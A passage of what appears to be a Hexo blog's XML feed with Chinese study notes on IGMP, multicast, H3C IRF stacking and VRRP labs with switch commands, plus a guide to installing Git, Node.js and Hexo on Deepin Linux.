        <content type="html"><![CDATA[<br /><br /><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><code>组播组管理协议</code></p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p><code>管理主机加入和离开组播组</code></p><p><code>维护本地组播组信息表</code></p><h3 id="IGMPv1"><a href="#IGMPv1" class="headerlink" title="IGMPv1"></a>IGMPv1</h3><p><em>主机加入</em></p><ul><li><strong>I</strong>.路由器向开启了IGMP的端口发送查询报文，询问该接口下有没有组播接收者</li><li><strong>II</strong>.收到查询报文的主机，如果希望接收某个组的组播，则向路由器回复report报文，把希望加入的组播组地址通告给路由器；如果不希望接收任何组播，则不回复</li><li><strong>III</strong>.收到report报文后，路由器就会在本地建立组播信息表，记录改组的（*、G）表项，后续将会转发该组组播</li></ul><p><em>主机离开</em></p><ul><li>默默离开</li><li>当路由器在后续的查询报文中没有收到某个组的report报文时，路由器将会把该组的（*、G）表项删除，不再转发该组组播</li></ul><p><em>查询器选举</em></p><ul><li>一个网段中只能有一个路由器负责处理组播，该路由器就是查询器</li><li>IGMPv1没有查询器选举机制，只能依靠上层组播路由协议选举</li></ul><p><em>成员报告抑制机制</em></p><ul><li>主机以组播224.0.0.1的地址发送report报文，该报文会发送至其他主机</li><li>收到该report报文的主机会启动计时器（10s）;在该计时器时间内，如果本机也希望加入该组播组，不会重复发送report报文</li></ul><p>主机希望加入某个组播组，不用等到路由器发送查询报文，会直接向路由器发送report报文</p><h3 id="IGMPv2"><a href="#IGMPv2" class="headerlink" title="IGMPv2"></a>IGMPv2</h3><p><em>主机加入</em></p><ul><li>路由器会周期性向开启了IGMP的接口发送普遍查询报文</li><li>其他和IGMPv1一致</li></ul><p><em>主机离开</em></p><ul><li><strong>I</strong>.主机主动向路由器发送Leave报文，通告希望离开的组播组地址</li><li><strong>II</strong>.路由器收到leave报文后，会发送指定组查询报文，询问该网段内是否还有主机希望接收该组的组播</li><li><strong>III</strong>.如网段内还有该组接收者，则该接收者会向路由器回复membership-report报文，通告路由器本机还希望接收该组播；如果不希望接收该组播，则不回复</li><li><strong>IV</strong>.如接收到membership-report报文，则不对组播组信息做任何操作；如没有接收到任何报文，则删除该组播组信息</li></ul><p><em>查询器选举</em></p><ul><li>自动选举</li><li>IP地址小的优先</li></ul><p><em>成员报告抑制机制</em></p><ul><li>与IGMPv1一致</li></ul><h3 id="IGMPv3"><a href="#IGMPv3" class="headerlink" title="IGMPv3"></a>IGMPv3</h3><p><em>主机上维护的组播信息</em></p><ul><li>组地址过滤模式源列表</li><li>主机通过发送membership-report报文向路由器通告本机当前组播信息状态、过滤模式变化、源列表变化</li></ul><p><em>路由器维护的组播信息</em></p><ul><li>组状态   （组地址、组定时器、过滤模式、源列表）</li><li>源列表（源地址、源定时器）</li></ul><p><em>主机加入</em></p><ul><li><strong>I</strong>.路由器发送普遍查询报文</li><li><strong>II</strong>.收到普遍查询报文的主机，如果希望加入某个组播组，就会发送membership-report报文；报文格式会包含组地址、源过滤模式、源列表</li><li><strong>III</strong>.路由器收到report报文后，会根据报文的汇总信息，生成相应的组播信息表项</li></ul><p><em>主机离开</em></p><p>离开某个组播源</p><ul><li><strong>I</strong>.主动向路由器发送membership-report报文、报文会包含希望变更的组播组地址、离开的源地址</li><li><strong>II</strong>.路由器收到该报文后，会发送指定组查询报文，询问是否还有其他主机希望接收该组播源在该组播地址发送的组播</li><li><strong>III</strong>.如果未收到回复，路由器则在组状态中删除该组播源；如果收到，则不做任何操作</li></ul><p>离开某个组播组</p><ul><li><strong>I</strong>.主动向路由器发送membership-report报文；报文包含希望离开的组播组和TO_IN（NULL）消息</li><li><strong>II</strong>.路由器收到该报文，会发送指定组查询报文，询问是否还有其他主机希望继续接收该组播</li><li><strong>III</strong>.如果未收到回复，路由器则删除该组播组的信息记录；如果收到，则不做任何操作</li></ul><p>取消成员报告抑制机制</p><h3 id="IGMP-Snooping"><a href="#IGMP-Snooping" class="headerlink" title="IGMP Snooping"></a>IGMP Snooping</h3><ul><li>用于在交换机上建立二层组播信息</li><li>二层交换机在不使能IGMP Snooping的情况下，默认把组播报文当做广播处理</li></ul><p><em>工作原理</em></p><ul><li>开启IGMP Snooping后，交换机会把收到普遍查询报文的接口设置为路由器接口</li><li>交换机只会把从路由器接口收到的组播报文转发至成员端口；从非路由器端口收到的组播报文丢弃</li><li>交换机从某个端口收到IGMP Report报文后，就自动把该端口加入到组播转发表的成员端口</li><li>交换机只会把Report报文从路由器端口转发，所有其他主机不会收到Report报文，不会触发成员报告抑制机制</li></ul><h3 id="组播VLAN"><a href="#组播VLAN" class="headerlink" title="组播VLAN"></a>组播VLAN</h3><ul><li>路由器只在组播VLAN内复制数据，减轻路由器负担，节省网络带宽资源</li><li>二层交换机在该组播Vlan的所有子Vlan中复制组播报文</li></ul><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[h3c]igmp#进入IGMP视图</span><br><span class="line">[h3c]igmp version &#x27;version&#x27;#配置IGMP版本</span><br><span class="line">[h3c-GigabitEthernet0/0]igmp enable #接口开启IGMP</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组播概述</title>
      <link href="/posts/8851"/>
      <url>/posts/8851</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><em>点到多点的通讯模式</em></li></ul><h3 id="组播关注的问题"><a href="#组播关注的问题" class="headerlink" title="组播关注的问题"></a>组播关注的问题</h3><ul><li><em>如何标识接收者</em>            <code>组播地址</code> </li><li><em>组播数据如何转发</em>        <code>组播分发树</code></li><li><em>组播转发路径如何建立</em>          <code>组播路由</code></li><li><em>终端设备如何加入&#x2F;离开组播组</em>          <code>IGMP</code></li><li><em>组播组成员信息如何维护</em>        <code>IGMP</code></li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul><li><em>组播地址</em>        <code>标识组播接收者</code></li><li><em>组播分发树</em>           <code>定义组播数据转发方式</code></li><li><em>组播路由协议</em>          <code>建立组播转发路径</code></li><li><em>IGMP</em><ul><li><code>定义终端设备加入/离开组播组</code></li><li><code>维护组播组成员信息</code></li></ul></li></ul><h3 id="组播地址"><a href="#组播地址" class="headerlink" title="组播地址"></a>组播地址</h3><p><em>地址范围</em><code>224.x.x.x-239.x.x.x</code></p><p><em>地址分类</em></p><ul><li><em>本地协议预留地址</em><code>224.0.0.0-224.0.1.255</code></li><li><em>用户组播地址</em><code>224.0.2.0-238.255.255.255</code></li><li><em>本地管理地址</em><code>239.0.0.0-239.255.255.255</code></li><li><em>组播MAC地址</em><code>01-00-5E-xx-xx-xx</code></li></ul><p><code>因为组播IP地址第5-9位不映射到组播MAC地址，所有某些组播IP对应的组播MAC会有重复。通过组播IP来判断是否是本机所需要的组播报文</code></p><h3 id="组播模型"><a href="#组播模型" class="headerlink" title="组播模型"></a>组播模型</h3><p><strong>ASM</strong></p><ul><li><code>任意信源组播</code></li><li><code>不区分组播源，所有组播源共享一个组播信息表</code></li></ul><p><strong>SSM</strong></p><ul><li><code>指定信源组播</code></li><li><code>区分组播源，每个组播源维护独立的组播信息表</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IRF实验</title>
      <link href="/posts/18054"/>
      <url>/posts/18054</url>
      
        <content type="html"><![CDATA[<br /><br /><hr><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/IRF%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.SW1，SW2，SW3，SW4 组成一台 IRF 堆叠设备</p><p><strong>II</strong>.交换机 IRF 设备 ID 与设备编号一致</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>　　<em>分析：根据需求，交换机 IRF 设备 ID 与设备编号一致，所以需要修改 SW2，SW3，SW4 的 IRF 设备 ID，并保存配置后，重启生效后才可进行后续配置</em><br>　　<br><em>步骤 1：修改 SW2 的 IRF 设备 ID 为 2，保存配置，并重启生效</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]irf member 1 renumber 2</span><br><span class="line">[SW2]save</span><br><span class="line">[SW2]reboot</span><br></pre></td></tr></table></figure><p><em>步骤 2：SW3 和 SW4 修改 IRF 设备 ID 方法与 SW2 一致，重启后，通过命令 <code>display irf</code> 确认设备 ID 已修改</em></p><p><em>步骤 3：在 SW1 上手动关闭堆叠物理口 F1&#x2F;0&#x2F;53 和 F1&#x2F;0&#x2F;54 口</em></p><p><em>步骤 4：在 SW1 上创建堆叠口 IRF-PORT1&#x2F;1，并加入物理口 F1&#x2F;0&#x2F;53，创建堆叠口 IRF-PORT1&#x2F;2，并加入物理口 F1&#x2F;0&#x2F;54</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]irf-port 1/1</span><br><span class="line">[SW1-irf-port1/1]port group interface FortyGigE1/0/53</span><br><span class="line">[SW1]irf-port 1/2</span><br><span class="line">[SW1-irf-port1/1]port group interface FortyGigE1/0/54</span><br></pre></td></tr></table></figure><p><em>步骤 5：在 SW1 上手动开启之前关闭的堆叠物理口 F1&#x2F;0&#x2F;53 和 F1&#x2F;0&#x2F;54</em></p><p><em>步骤 6：在 SW1 上保存配置</em></p><p><em>步骤 7：在 SW1 上激活 IRF 配置</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[H3C]irf-port-configuration active</span><br></pre></td></tr></table></figure><p><em>步骤 8：SW2，SW3 和 SW4 配置方法与 SW1 一致，配置时注意设备 ID 已变更</em></p><p><em>步骤 9：SW2，SW3 和 SW4 配置完成后，所有交换机会自动选举 Master 设备，选举失败的设备会自动重启，重启完成后堆叠建立完成，所有 Slave 设备的配置会与 Master 设备同步</em></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IRF</title>
      <link href="/posts/17517"/>
      <url>/posts/17517</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li>智能弹性架构</li><li>H3C的堆叠技术</li><li>通过把多台物理交换机虚拟成一台逻辑设备来提高可靠性和性能</li></ul><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul><li>大幅简化配置管理</li><li>提高整体设备性能</li><li>设备扩展简便</li><li>大幅提高设备可靠性</li></ul><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><ul><li>I.建立物理连接</li><li>II.通过向所有堆叠口发送Hello报文来收集堆叠组的拓扑信息</li><li>III.选举Master设备        选举失败的设备会自动重启，重启完成后成为Slave设备</li><li>IV.进入到IRF的维护阶段</li></ul><h3 id="Master设备选举规则"><a href="#Master设备选举规则" class="headerlink" title="Master设备选举规则"></a>Master设备选举规则</h3><ul><li>I.优先级大的优先优先级默认为1</li><li>II.系统运行时间长的优先</li><li>III.MAC地址小的优先</li></ul><h3 id="IRF形成的必要条件"><a href="#IRF形成的必要条件" class="headerlink" title="IRF形成的必要条件"></a>IRF形成的必要条件</h3><ul><li>I.堆叠口中的物理接口必须是万兆以上的接口</li><li>II.一台设备上最多有2个堆叠口</li><li>III.一台设备的1号堆叠口必须连接到另一台设备的2号堆叠口</li><li>IV.所有堆叠的物理设备的操作系统版本必须一致</li></ul><h3 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h3><ul><li>I.更改设备编号</li><li>II.保存配置，手动重启更改设备ID的交换机</li><li>III.手动shutdown要加入到堆叠中的物理口</li><li>IV.创建虚拟堆叠口，并加入相应的物理口</li><li>V.手动开启物理口</li><li>VI.保存配置</li><li>VII.激活IRF配置</li></ul><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[h3c]irf-port &#x27;member-id/port-id&#x27;#创建IRF堆叠口</span><br><span class="line">[h3c]port group interface &#x27;port-id&#x27;# 物理口加入到堆叠口</span><br><span class="line">[h3c]irf member &#x27;member-id&#x27; renumber &#x27;new-member-id&#x27;#更改IRF设备ID</span><br><span class="line">[h3c]irf-port-configuration active #激活IRF配置</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux环境部署Hexo</title>
      <link href="/posts/30964"/>
      <url>/posts/30964</url>
      
        <content type="html"><![CDATA[<br /><p><img src="/images/%E6%9D%82%E5%9B%BE/%E8%A1%A8%E6%83%85%E5%8C%8502.png"></p><br /><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>系统环境：deepin</p><p>基于Deepin，其他Linux系统可做参考</p><p>需要的文件：GIt、node.js</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><strong>I</strong>.首先安装Git</p><ul><li>a.终端输入<code>sudo apt-get install git</code> </li><li>b.等待完成后分别输入 <code>git config --global user.name &quot;你的昵称&quot; </code>和 <code>git config --global user.email &quot;你的邮箱&quot;</code>并替换为你的昵称和邮箱。 </li><li>c.之后要生成秘钥输入<code>ssh-keygen -t rsa -C &quot;你的昵称&quot;</code> 连点三次回车后生成。</li></ul><p><strong>II</strong>.安装nodejs</p><p>第一种方法：</p><ul><li>1a.终端输入<code>wget -c https://npm.taobao.org/mirrors/node/v12.14.1/node-v12.14.1-linux-x64.tar.xz</code></li></ul><p>（请根据最新的nodejs的版本来下载，可以到<a href="http://nodejs.cn/download/">nodejs中文网</a> 查看） </p><ul><li>1b.查看文件<code>ls</code> </li><li>1c.进行解压<code>tar -xvf node-v12.14.1-linux-x64.tar.xz</code> </li><li>1d.文件夹重命名为nodejs<code>mv node-v12.14.1-linux-x64 nodejs</code> 1e.将nodejs文件夹移动**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;**下<code>sudo mv /nodejs/ /usr/local/bin/</code></li></ul><p>第二种方法：</p><p>基于DEEPIN系统是可视化操作的，所以可以直接进行手动操作。</p><ul><li>1a.直接去nodejs中文网<a href="http://nodejs.cn/download/">nodejs中文网</a>，直接下载</li><li>1b.完成之后点击打开，上面有提取按钮，直接点击提取。</li><li>1c.出来提示窗口，直接点击打开，之后重命名为nodejs。</li><li>1d.之后右键点击复制，之后进入系统盘,进入usr 在进入local文件夹之后，右键点击bin,以管理员身份打开，之后进入，右键复制即可。</li></ul><p><strong>III</strong>.建立软连接和安装HEXO</p><ul><li>a.终端运行<code>sudo ln -s /usr/local/bin/nodejs/bin/node /usr/local/bin/</code> 和<code>sudo ln -s /usr/local/bin/nodejs/bin/npm /usr/local/bin/</code></li><li>b.之后运行<code>node -v</code>和<code>npm -v</code>查看版本号，确实是否安装成功</li><li>c.更换软件源<code>sudo npm config set registry https://registry.npm.taobao.org</code></li><li>d.开始安装<code>sudo npm install hexo-cli -g</code></li><li>e.给hexo建立软连接<code>sudo ln -s /usr/local/bin/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo</code></li></ul><p><strong>IV</strong>.建立Hexo文件夹</p><ul><li><p>a.依次输入完成之后，等待完成，可能比较慢</p><details><summary>下载过慢或执行时间过长请看：</summary><p><b>    因hexo init 需要连接github进行下载基础包和主题包，可以采用用以下方式 或下载准备的整合包，直接解压到你要安装的文件夹。下载链接(每周会对比官网源文件更新):  [downloadhref="https://halfye.coding.net/p/allblog/d/allblog/git/tree/master/hexo" target="blank"]点击下载[/download]之后执行npm install，如果不行则执行npm install - save</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line">cd hexo</span><br><span class="line">hexo init</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><ul><li>b.还需要运行 <code>npm install hexo-deployer-git --save</code></li></ul><p>GIt平台操作</p><p><strong>V</strong>.选择你的平台如conding、github等。找到项目ssh复制下来</p><p><strong>VI</strong>.找到你安装博客文件夹下_config.yml配置文件并打开</p><p>修改添加为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy</span>:</span><br><span class="line">  <span class="attr">type</span>: git</span><br><span class="line">  <span class="attr">repository</span>: 你复制的ssh</span><br><span class="line">  <span class="attr">branch</span>: master   #项目分支</span><br></pre></td></tr></table></figure><p>保存退出。</p><p><strong>VII</strong>.终端输入<code>cd .ssh</code>进入.ssh文件夹内，之后输入<code>more id_rsa.pub</code>读出公钥，将公钥复制出来，例如我使用的github,则粘贴到github上秘钥填写的地方。</p><p><img src="/images/%E6%9C%AC%E5%9C%B0hexo%E8%BF%9E%E6%8E%A5Github/%E6%9C%AC%E5%9C%B0github.jpg"></p><p><strong>VIII</strong>.部署到github则需要执行<code>hexo d</code>指令，步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean 清除之前部署的文件</span><br><span class="line">hexo g 生成新的部署文件。</span><br><span class="line">hexo d 上传到coding的项目库中。</span><br><span class="line">（hexo g和 hexo d 可以用一个指令代替hexo g --d） (首次部署要输入yes)</span><br></pre></td></tr></table></figure><br />]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VRRP实验</title>
      <link href="/posts/10668"/>
      <url>/posts/10668</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/VRRP%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.按照图示配置 IP 地址和网关</p><p><strong>II</strong>.在 SW1，SW2，SW3 上创建 Vlan10 和 Vlan20，对应 IP 网段如图，交换机之间链路允许所有 VLAN 通过</p><p><strong>III</strong>.在 SW1 和 SW2 上配置 VRRP，要求 SW1 成为 Vlan10 的主网关，SW2 成为 Vlan20 的主网关；SW1 和 SW2 互为备份</p><p><strong>IV</strong>.SW1 和 SW2 对上行接口进行监视，如上行接口故障，会触发 VRRP 角色切换</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p><strong>I</strong>.<strong>配置 IP 地址部分略</strong></p><p><strong>II</strong>.<strong>配置 Vlan 和 Trunk 部分略</strong></p><p><strong>III</strong>.<strong>在 SW1 和 SW2 上配置 VRRP，要求 SW1 成为 Vlan10 的主网关，SW2 成为 Vlan20 的主网关；SW1 和 SW2 互为备份</strong></p><p>　　<em>分析：根据需求，SW1 和 SW2 分别在 Vlan10 和 Vlan20 的三层接口中配置 VRRP<br>　　根据图中 PC 配置的网关得知，Vlan10 中的虚拟网关地址为 <code>192.168.1.254/24</code>，Vlan20 中的虚拟网关地址为 <code>192.168.2.254/24</code><br>　　根据需求，SW1 成为 Vlan10 的主网关，需要把 SW1 在 Vlan10 中的 VRRP 优先级修改到大于100，另外要让 SW2 成为 Vlan20 的主网关，需要把 SW2 在 Vlan20 中的 VRRP 优先级修改到大于100</em><br>　　<br><em>步骤 1：在 SW1 的 Vlan10 上配置 VRRP，虚拟 IP 地址为 <code>192.168.1.254/24</code>，优先级为 120，在 Vlan20 上配置 VRRP，虚拟 IP 地址为 <code>192.168.2.254/24</code>，优先级不修改，保持默认值 100</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW1-Vlan-interface10]vrrp vrid 10 virtual-ip 192.168.1.254</span><br><span class="line">[SW1-Vlan-interface10]vrrp vrid 10 priority 120</span><br><span class="line">[SW1-Vlan-interface20]vrrp vrid 20 virtual-ip 192.168.2.254</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW1 的 Vlan10 上配置 VRRP，虚拟 IP 地址为 <code>192.168.1.254/24</code>，优先级不修改，保持默认值 100，在 Vlan20 上配置 VRRP，虚拟 IP 地址为 <code>192.168.2.254/24</code>，优先级为 120</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2-Vlan-interface10]vrrp vrid 10 virtual-ip 192.168.1.254</span><br><span class="line">[SW2-Vlan-interface20]vrrp vrid 20 virtual-ip 192.168.2.254</span><br><span class="line">[SW2-Vlan-interface20]vrrp vrid 20 priority 120</span><br></pre></td></tr></table></figure><p><em>效果测试：在 SW1 和 SW2 上分别查看 VRRP，发现主备选举正常</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]display vrrp</span><br><span class="line"></span><br><span class="line">Interface          VRID  State       Running Adver     Auth     Virtual</span><br><span class="line">                                      pri     timer(cs) type     IP</span><br><span class="line">    ---------------------------------------------------------------------</span><br><span class="line">Vlan10             10    Master      120     100       None     192.168.1.254   </span><br><span class="line">Vlan20             20    Backup      100     100       None     192.168.2.254   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW2]display vrrp</span><br><span class="line"></span><br><span class="line">Interface          VRID  State       Running Adver     Auth     Virtual</span><br><span class="line">                                      pri     timer(cs) type     IP</span><br><span class="line">    ---------------------------------------------------------------------</span><br><span class="line">Vlan10             10    Backup      100     100       None     192.168.1.254   </span><br><span class="line">Vlan20             20    Master      120     100       None     192.168.2.254   </span><br></pre></td></tr></table></figure><p><strong>IV</strong>.<em>SW1 和 SW2 对上行接口进行监视，如上行接口故障，会触发 VRRP 角色切换</em></p><p>　　<em>分析：正常情况下，设备接口故障不会触发 VRRP 角色切换，所以需要配置上行接口监视，来使接口故障后，自动降低本设备 VRRP 优先级来触发 VRRP 角色切换<br>　　上一步配置的主设备优先级为 120，备用设备是 100，所以接口监视需要至少降低 21 才能触发角色切换</em><br>　　<br><em>步骤 1：在 SW1 上配置接口监视，监视上行接口 G1&#x2F;0&#x2F;2，并在 Vlan10 接口中调用，优先级降低 30</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]track 1 interface g1/0/2</span><br><span class="line">[SW1-Vlan-interface10]vrrp vrid 10 track 1 priority reduced 30</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW2 上配置接口监视，监视上行接口 G1&#x2F;0&#x2F;2，并在 Vlan20 接口中调用，优先级降低 30</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW2]track 1 interface g1/0/2</span><br><span class="line">[SW2-Vlan-interface20]vrrp vrid 20 track 1 priority reduced 30</span><br></pre></td></tr></table></figure><p><em>效果测试：在 SW1 上关闭 G1&#x2F;0&#x2F;2 口，发现 SW1 在 Vlan10 的 VRRP 优先级降低到 90，且已经切换为备份网关</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet1/0/2]shutdown</span><br><span class="line">[SW1]display vrrp</span><br><span class="line"></span><br><span class="line">Interface          VRID  State       Running Adver     Auth     Virtual</span><br><span class="line">                                     pri     timer(cs) type     IP</span><br><span class="line">    ---------------------------------------------------------------------</span><br><span class="line">Vlan10             10    Backup      90      100       None     192.168.1.254   </span><br><span class="line">Vlan20             20    Backup      100     100       None     192.168.2.254 </span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VRRP</title>
      <link href="/posts/1421"/>
      <url>/posts/1421</url>
      
        <content type="html"><![CDATA[<br /><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><ul><li><em>终端设备只能配置一个网关</em></li><li><em>多网关冗余环境下，用户只能自行更改配置来实现故障切换</em></li></ul><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><em>虚拟路由冗余协议</em></li><li><em>将多个网关设备加入到备份组中，形成一台虚拟网关</em></li></ul><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ul><li><em>VRRP协议报文使用组播发送，组播地址224.0.0.18</em></li><li><em>一个VRRP备份组会选举一个主网关和若干备份网关</em></li><li><em>VRRP选举规则：</em><ul><li><code>I.优先级大的优先</code><ul><li><code>优先级默认都是100</code></li><li><code>可配置的范围0-254</code></li><li><code>备份组中，某个网关设备真实IP与虚拟IP一致，则该网关优先级自动变为255，成为主网关</code></li></ul></li><li><code>II.IP地址大的优先</code></li></ul></li><li><em>VRRP角色切换条件</em><ul><li><code>当前的主网关设备故障，导致备份网关无法接受到心跳报文</code></li><li><code>备份组中出现优先级更高的网关设备  VRRP默认工作在抢占模式</code></li></ul></li></ul><h3 id="VRRP接口监视"><a href="#VRRP接口监视" class="headerlink" title="VRRP接口监视"></a>VRRP接口监视</h3><ul><li><em>技术背景</em><ul><li><code>如果网关设备的上行链路故障，而网关本身正常，不会导致角色切换，但发送本网关的数据已经无法连通外部网络</code></li></ul></li><li><em>解决方案</em><ul><li><code>VRRP监视上行接口状态，当上行接口Down，主动降低本网关优先级，以触发角色抢占</code></li></ul></li></ul><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[h3c-vlan-interface10]vrrp vrid &#x27;vrid&#x27; virtual-ip &#x27;ip-address&#x27; #配置VRRP虚拟IP地址</span><br><span class="line">[h3c-vlan-interface10]vrrp vrid &#x27;vrid&#x27; priority &#x27;priority&#x27;   #配置VRRP优先级</span><br><span class="line">[h3c]track &#x27;tracker-id&#x27; interface &#x27;port-name&#x27;  #配置接口监视</span><br><span class="line">[h3c-vlan-interface10]vrrp vrid &#x27;vrid&#x27; track &#x27;tracker-id&#x27; reduced &#x27;priority&#x27;  #VRRP中调用接口监视</span><br></pre></td></tr></table></figure><br />]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RRPP实验</title>
      <link href="/posts/9580"/>
      <url>/posts/9580</url>
      
